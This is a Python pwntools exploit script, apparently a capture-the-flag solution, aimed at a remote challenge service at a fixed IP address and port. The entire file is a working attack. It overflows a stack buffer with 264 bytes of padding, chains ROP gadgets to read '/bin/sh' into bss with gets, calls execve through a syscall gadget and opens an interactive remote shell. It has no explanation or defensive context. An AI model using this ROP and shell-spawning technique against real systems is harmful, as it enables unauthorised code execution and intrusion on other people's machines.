from pwn import *

def exploit():
    # p = process("./chall")
    p = remote("18.179.178.246", 9010)

    padding = 264
    bss = 0x604240 + 0x100
    pop_rdi = 0x40141c
    pop_rax = 0x400121
    pop_rsi_r15 = 0x40141a
    syscall = 0x4003fc
    pop_rdx = 0x4023f5
    gets = 0x4004ee

    payload = ''
    payload += 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(gets)
    payload += p64(pop_rax)
    payload += p64(0x3b)
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(pop_rsi_r15)
    payload += p64(0)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(syscall)

    # gdb.attach(p, 'b *0x40019c')

    p.sendline(payload)
    p.sendline("/bin/sh\x00")
    p.interactive()


if __name__ == "__main__":
    exploit()